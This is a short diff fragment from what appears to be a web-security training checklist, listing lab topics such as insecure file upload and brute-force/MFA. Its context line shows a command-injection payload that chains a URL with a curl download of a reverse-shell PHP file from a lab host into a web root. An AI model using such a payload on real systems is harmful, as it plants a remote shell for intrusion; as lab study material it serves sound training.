@@ -245,6 +245,8 @@ Command: https://tcm-sec.com && curl 192.168.17.133:8080/rev.php > /var/www/html
 - [ ] Insecure File Upload - Basic | Magic Bytes
 
 
+
+
 - [ ] Authentication - Brute Force | MFA
 
 
